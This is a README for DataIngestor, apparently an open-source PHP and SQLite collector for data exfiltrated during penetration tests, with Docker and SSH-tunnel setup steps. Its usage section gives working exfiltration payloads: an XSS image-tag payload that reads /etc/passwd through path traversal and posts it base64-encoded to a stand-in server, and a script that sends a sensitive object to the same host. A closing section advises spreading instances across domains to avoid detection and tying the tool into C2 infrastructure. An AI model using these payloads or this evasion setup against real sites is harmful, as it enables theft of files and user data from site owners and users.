# DataIngestor

A powerful data collection and management system designed for offensive security operations, capable of ingesting, storing, and displaying data submissions from various sources during penetration tests and security assessments.

## Overview

DataIngestor provides a lightweight PHP-based web interface for collecting and managing data exfiltrated during security testing. It features IP-based access control, SQLite database storage, and a responsive UI for data display and management. This tool is particularly valuable for offensive security engineers to collect data from exploited XSS, SSRF, or other client-side vulnerabilities.

## Features

- **Data Capture**: Collect arbitrary data via HTTP POST requests
- **IP Filtering**: Restrict access by IP address and CIDR ranges
- **Automatic IP Logging**: Track the source of all submissions
- **Base64 Detection**: Automatic detection and decoding of Base64-encoded data
- **Real-time Updates**: Automatic refresh when new data is received
- **Docker Support**: Easy containerized deployment
- **Proxy Configuration**: Support for remote tunneling scenarios
- **Responsive UI**: Mobile-friendly interface with data management capabilities

## Docker Setup

### Prerequisites

- Docker and Docker Compose installed on your system
- Basic understanding of networking and port forwarding

### Quick Start

1. **Clone the repository**:
   ```
   git clone https://yourrepository.git/DataIngestor
   cd DataIngestor
   ```

2. **Configure Access Control**:
   Create or modify the `306d717c3f592af0186ed31e2f056a7d/config.php` file:
   ```php
   <?php
   // Define the allowed CIDR range and IP addresses
   $allowedCIDR = "0.0.0.0/0";  // Allow all IPs (for testing only)
   $allowedIPs = ["127.0.0.1", "YOUR_PUBLIC_IP"];  // Add specific IPs
   ?>
   ```

3. **Start the Docker container**:
   ```
   docker-compose up -d
   ```

4. **Access the application**:
   Open your browser and navigate to `http://localhost:8080`

### Docker Configuration Options

The `docker-compose.yml` file can be customized:

```yaml
version: '3'

services:
  dataingestor:
    build:
      context: .
      dockerfile: Dockerfile
    ports:
      - "8080:80"  # Change the left number to modify the host port
    volumes:
      - ./306d717c3f592af0186ed31e2f056a7d:/var/www/html/306d717c3f592af0186ed31e2f056a7d
    environment:
      - APACHE_DOCUMENT_ROOT=/var/www/html
    restart: unless-stopped
    networks:
      - dataingestor-network

networks:
  dataingestor-network:
    driver: bridge
```

## Manual Setup (Without Docker)

If you prefer to run without Docker:

### 1. Create the SQLite Database

```console
cd 306d717c3f592af0186ed31e2f056a7d
sqlite3 data.db "CREATE TABLE entries (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    data TEXT NOT NULL,
    referrer TEXT,
    client_ip TEXT NOT NULL,
    entry_datetime DATETIME
);"
```

### 2. Configure Access Control

Create a `config.php` file as described in the Docker setup section.

### 3. Start the PHP Server

```console
php -S 0.0.0.0:6745 -t ./
```

## Remote Deployment Options

### Using SSH Tunneling

To expose your local instance to the internet (useful during penetration tests):

1. Set up an SSH tunnel to a remote server with a public IP:
   ```
   ssh root@<remote-ip> -R 6745:127.0.0.1:6745
   ```

2. Configure the Nginx proxy on your remote server by copying `proxy.conf` to `/etc/nginx/conf.d/proxy.conf` and restarting Nginx.

### Using Docker on a Remote Server

1. Clone the repository on your remote server
2. Configure `config.php` with appropriate IP restrictions
3. Run `docker-compose up -d`
4. Configure firewall rules to allow inbound connections on port 8080 (or your configured port)

## Usage Examples

### Basic Data Submission

Send data using cURL:

```console
curl -X POST -d "data=exfiltrated_content" http://your-server:8080/
```

### XSS Payload for Data Exfiltration

```html
<img src=x onerror="fetch('/vulnerable/path?file=../../../../etc/passwd')
.then(response => response.text())
.then(data => {
    const f = document.createElement('form');
    f.innerHTML = '<input name=data value=' + btoa(data) + '>';
    f.method = 'post';
    f.action = 'http://your-server:8080/';
    document.body.appendChild(f);
    f.submit();
});">
```

### Extracting Data from JavaScript Objects

```javascript
<script>
fetch('http://your-server:8080/', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'data=' + btoa(JSON.stringify(sensitiveObject))
});
</script>
```

## Security Considerations

- In production, restrict IP access to your team's addresses only
- Consider implementing authentication for the web interface
- Use HTTPS when deployed in production environments
- Review the logs regularly for unauthorized access attempts
- The Docker image uses PHP 7.4, which may have security vulnerabilities - update to newer versions for production use

## Troubleshooting

- **403 Forbidden errors**: Check the IP configuration in `config.php`
- **Database errors**: Ensure the database exists and has the correct permissions
- **Connection issues**: Verify that the Docker container is running and ports are correctly mapped
- **Docker build failures**: Check for proper Docker and Docker Compose installation

## For Offensive Security Operations

- Consider setting up with multiple instances across different domains to avoid detection
- Implement a dead drop protocol for sensitive data exfiltration
- Use in conjunction with DNS/ICMP exfiltration tools for complete coverage
- Integrate with your existing C2 infrastructure for centralized data collection